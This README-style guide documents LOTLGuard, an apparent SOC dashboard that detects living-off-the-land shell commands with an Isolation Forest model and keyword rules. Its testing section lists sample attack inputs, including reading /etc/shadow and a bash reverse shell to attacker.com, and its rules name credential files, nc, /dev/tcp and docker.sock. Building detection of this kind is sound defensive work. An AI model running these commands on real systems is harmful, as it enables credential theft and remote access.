# LOTLGuard Framework | Local Execution & Testing Guide

This guide explains how to run the LOTLGuard SOC Dashboard, use the Shared Kernel Simulator, and test detection against local datasets.

---

## 🗂️ 0. Project Folder Map

This section explains what each major folder is for, what it does, and whether it stores logs.

### Core runtime folders

| Folder | Purpose | What it does | Stores logs? |
| --- | --- | --- | --- |
| `dashboard/` | Web UI and dashboard backend | Runs the SOC dashboard, exposes API endpoints, and renders live incident views, topology, and quarantine pages | No primary log storage, but it can clear or display runtime logs |
| `attack_simulation/` | Shared Kernel simulator and bulk attack playback | Generates live attack events, injects commands into the pipeline, and contains the command test suite | No direct log storage, but it writes into the main runtime event log through the injector |
| `backend/` | Detection and response engine | Handles event processing, threat scoring, geolocation, quarantine state, and mitigation logic | No direct log folder, but it reads and updates runtime state |
| `detection/` | Anomaly detection layer | Loads the ML model and predicts whether a command is normal or anomalous | No |
| `parser/` | Log parsing layer | Converts raw JSON log lines into structured events | No |
| `response/` | Incident response layer | Chooses the response message and mitigation behavior for each threat level | No |
| `monitoring/` | Stream and cluster monitoring | Reads live events, tracks attackers, and optionally connects to Kubernetes/Falco streams | No |
| `feature_engineering/` | Feature preparation | Builds the model input features from commands | No |
| `model/` | Trained ML artifacts | Stores the trained detector and vectorizer used by the live pipeline | No |

### Data and log folders

| Folder | Purpose | What it does | Stores logs? |
| --- | --- | --- | --- |
| `logs/` | Main runtime log store | Holds the live event stream that the backend tails and the dashboard reads | Yes, this is the primary live log folder |
| `data/quarantine/` | Quarantine database and forensic archive | Stores the active quarantine database plus per-isolation forensic records | Yes, it stores quarantine history and forensic logs |
| `dataset/` | Training and analysis data | Holds the feature dataset used for model training, verification, and offline analysis | No runtime logs; mostly dataset files |
| `graphs/` | Offline chart helpers | Produces visualizations from dataset or model output | No |
| `mitre/` | MITRE mapping utilities | Maps detections to MITRE ATT&CK techniques | No |

### Important log locations

- `logs/falco_events.log`: main live event log. Commands typed in the Shared Kernel are injected here and then read by the dashboard pipeline.
- `data/quarantine/quarantine_db.json`: persistent quarantine state for pods and users.
- `data/quarantine/logs/*.json`: per-quarantine forensic records.

### What is not a live runtime log

- `dataset/features.csv`: model feature data, not a live security log.
- `dataset/command_logs.csv`: supporting data for analysis or experiments, not the main live stream.
- `attack_simulation/attack_database.csv`: simulation/reference data, not the primary runtime event log.
- `attack_simulation/quarantine_database.csv`: simulation/reference quarantine data, not the active runtime database.

## 🤖 2. Machine Learning & Tools Overview

### Machine Learning Stack

#### Detection Model
```
Type:           Unsupervised Anomaly Detection (Isolation Forest)
Library:        Scikit-learn 1.0+
Input:          TF-IDF vectorized command strings (sparse matrix)
Output:         Anomaly score (0-1), binary classification
Accuracy:       ~95% on test set
False Pos Rate: ~2% (tuned for low false positives)
Latency:        <50ms per prediction
```

#### Feature Engineering Pipeline
```
Stage 1: Text Vectorization
  - TfidfVectorizer from scikit-learn
  - Handles Unix command syntax
  - N-gram analysis (1-3 grams)

Stage 2: Custom Feature Extraction
  - Command length, entropy
  - Dangerous tool presence (bash, nc, chmod, etc.)
  - File path patterns (/etc, /root, /var/log)
  - Network indicators (IPs, domains)
  - Special character sequences

Stage 3: Feature Scaling
  - StandardScaler normalization
  - Handles variable feature ranges
  - Prevents ML bias toward high-variance features
```

#### Training Process
```
Data: 2000+ historical commands
  - 1500 benign (ls, cat, echo, curl, python, node)
  - 500 malicious (cat /etc/shadow, bash reverse shell, etc.)

Preprocessing:
  - Lowercase normalization
  - Tokenization by spaces & operators
  - Remove low-frequency tokens
  
Cross-validation: 5-fold stratified
Hyperparameters:
  - contamination: 0.1 (10% outlier assumption)
  - n_estimators: 100 (trees in forest)
  - max_samples: 256 (samples per tree)

Evaluation Metrics:
  - ROC-AUC: 0.96
  - Precision: 0.94
  - Recall: 0.92
  - F1-Score: 0.93
```

### Threat Detection Stack

#### Heuristic Rules
```
1. Credential Access Detection
   IF command contains: /etc/shadow, /etc/passwd, ~/.ssh, /root/.kube
   THEN: threat_score += 25

2. Code Execution Detection
   IF command contains: bash, sh, nc, /dev/tcp, >& /dev
   THEN: threat_score += 20

3. Persistence Detection
   IF command contains: crontab, systemctl, /etc/init.d, SSH keys
   THEN: threat_score += 15

4. Exfiltration Detection
   IF command contains: curl/wget + post, scp to external IP
   THEN: threat_score += 20

5. Privilege Escalation Detection
   IF command contains: chmod 4755, sudo -u, setuid, /proc/sys
   THEN: threat_score += 18

6. Log Tampering Detection
   IF command contains: rm /var/log, > /dev/null, history -c
   THEN: threat_score += 22

7. Container Escape Detection
   IF command contains: nsenter, chroot, /var/run/docker.sock
   THEN: threat_score += 25
```

#### Anomaly Scoring Algorithm
```
final_score = (
    ml_anomaly_score * 0.5 +           # 50% weight on ML model
    heuristic_score * 0.3 +             # 30% weight on rule-based
    behavioral_deviation * 0.2          # 20% weight on baseline
) * 100

WHERE:
  ml_anomaly_score:       Isolation Forest outlier score (0-1)
  heuristic_score:        Rule-based pattern matching (0-1)
  behavioral_deviation:   Deviation from pod baseline (0-1)
```

## 🛠️ 4. Testing Attacks in Real-Time

Once both apps are running:
1. Go to the **Shared Kernel** (port 5051).
2. Type "Living-off-the-Land" commands like:
   - `whoami` (Basic reconnaissance)
   - `ls /etc` (Sensitive directory listing)
   - `cat /etc/shadow` (Critical alert: Credential access)
   - `bash -i >& /dev/tcp/attacker.com/4444 0>&1` (Reverse shell)
3. Switches to the **SOC Dashboard** (port 5050) to see:
   - Real-time alerts in the **Incident Feed**.
   - Anomaly pods glowing RED in the **User Topology**.
   - Risk score updates in the **Behavioral Analytics** section.

### What happens when you type a listed command
Any command from the MITRE list below is logged by the Shared Kernel, written into the event stream, parsed by the backend, scored for threat level, and then displayed on the dashboard with the matching incident response message. In practice, the dashboard can show:
- **Critical** for the most dangerous commands
- **High** for suspicious download, beaconing, persistence, or log-cleanup behavior
- **Medium** for discovery, permissions, and enumeration activity
- **Low** for basic benign system discovery commands

### Complete Data Flow

```
┌─ SIMULATION LAYER ──────────────────────────────────────────┐
│  Browser (Port 5051)                                        │
│  ├─ Shared Kernel Terminal (Attack Simulator)              │
│  └─ User types malicious commands (e.g., cat /etc/shadow) │
└─────┬──────────────────────────────────────────────────────┘
      │ HTTP POST /api/simulate
      ▼
┌─ INJECTION LAYER ───────────────────────────────────────────┐
│  attack_simulation/inject_command.py                        │
│  ├─ Validate command syntax                                │
│  ├─ Generate kernel_id (MD5 hash)                         │
│  ├─ Attach metadata (source_ip, pod_name, timestamp)      │
│  └─ Write to logs/falco_events.log                        │
└─────┬──────────────────────────────────────────────────────┘
      │ JSON event line written to disk
      ▼
┌─ PARSING LAYER ─────────────────────────────────────────────┐
│  parser/falco_parser.py (tailed by event_processor.py)     │
│  ├─ Read raw JSON from log file stream                     │
│  ├─ Parse: time, command, pod, user, exit_code            │
│  ├─ Validate JSON integrity                               │
│  └─ Return structured event dict                          │
└─────┬──────────────────────────────────────────────────────┘
      │ Structured event object
      ▼
┌─ FEATURE EXTRACTION LAYER ──────────────────────────────────┐
│  feature_engineering/feature_builder.py                     │
│  ├─ TF-IDF vectorization (model/vectorizer.pkl)           │
│  ├─ Custom features: length, entropy, dangerous tools     │
│  ├─ Normalize via StandardScaler                          │
│  └─ Return feature vector (numpy array)                   │
└─────┬──────────────────────────────────────────────────────┘
      │ Feature vector [0.23, 0.87, 0.12, ...]
      ▼
┌─ ANOMALY DETECTION ─────────────────────────────────────────┐
│  detection/realtime_detector.py                            │
│  ├─ Load Isolation Forest model (model/isolation_forest    │
│  │   _model.pkl)                                           │
│  ├─ Predict: anomaly_score (0-1 confidence)               │
│  └─ Return: anomaly_flag, confidence                      │
└─────┬──────────────────────────────────────────────────────┘
      │ Anomaly score: 0.89 (HIGH anomaly)
      ▼
┌─ THREAT SCORING LAYER ──────────────────────────────────────┐
│  backend/threat_scoring.py                                 │
│  ├─ Apply heuristic rules (dangerous keywords, patterns)   │
│  ├─ Combine: ML score + heuristics + baseline deviation   │
│  ├─ Weights: 50% ML + 30% rules + 20% behavior           │
│  └─ Normalize: final score (0-100)                        │
└─────┬──────────────────────────────────────────────────────┘
      │ Threat score: 82 (CRITICAL)
      ▼
┌─ ENRICHMENT LAYER ──────────────────────────────────────────┐
│  backend/event_processor.py                                │
│  ├─ Geolocation: IP → city, country, ISP                  │
│  ├─ Pod stats: Update command history, anomaly count      │
│  ├─ Incident creation: Store in latestData                │
│  ├─ Attacker tracking: Update GeoIP + IP-based stats      │
│  └─ Return: fully enriched event                          │
└─────┬──────────────────────────────────────────────────────┘
      │ Enriched event with location, pod info, scores
      ▼
┌─ RESPONSE LAYER ────────────────────────────────────────────┐
│  response/incident_response.py                             │
│  ├─ Decision tree: threat_score → action                  │
│  ├─ Severity levels: Critical > High > Medium > Low       │
│  ├─ Actions: Quarantine (82+), Block (65-81), Warn (<65)  │
│  └─ Trigger auto-mitigation (if enabled)                 │
└─────┬──────────────────────────────────────────────────────┘
      │ Quarantine order issued
      ▼
┌─ QUARANTINE LAYER ──────────────────────────────────────────┐
│  backend/quarantine_manager.py                             │
│  ├─ Update data/quarantine/quarantine_db.json             │
│  ├─ Create forensic record in data/quarantine/logs/       │
│  ├─ Optional: Update Kubernetes network policy            │
│  └─ Return: quarantine status                             │
└─────┬──────────────────────────────────────────────────────┘
      │ Quarantine confirmed
      ▼
┌─ STORAGE LAYER ─────────────────────────────────────────────┐
│  JSON State Machines                                        │
│  ├─ logs/falco_events.log (append-only event log)         │
│  ├─ data/quarantine/quarantine_db.json (isolation state)  │
│  ├─ data/quarantine/logs/*.json (forensic records)        │
│  └─ In-memory threat_history (for graphs)                │
└─────┬──────────────────────────────────────────────────────┘
      │ State persisted to disk
      ▼
┌─ DISPLAY LAYER ─────────────────────────────────────────────┐
│  Browser (Port 5050)                                       │
│  ├─ dashboard/app.py (Flask API every 3 seconds)         │
│  ├─ Fetch /api/status → latestData                        │
│  ├─ Render: incident feed, topology tree, charts         │
│  └─ Show alert: "CRITICAL: Pod isolated in VAULT"       │
└─────────────────────────────────────────────────────────────┘
```

  - Growth rate: ~10 KB per event
